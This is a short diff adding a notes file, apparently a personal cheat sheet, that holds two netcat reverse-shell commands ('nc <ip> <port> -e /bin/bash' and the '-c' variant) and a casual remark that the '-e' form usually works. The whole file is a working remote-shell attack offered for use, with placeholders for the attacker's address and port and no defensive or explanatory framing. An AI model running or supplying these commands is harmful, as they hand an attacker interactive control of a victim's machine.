@@ -1,0 +1,5 @@
+nc <ip> <port> -e /bin/bash
+
+nc <ip> <port> -c /bin/bash
+
+normally the -e one works havent tried the -c but if the -e doesnt can always try -c
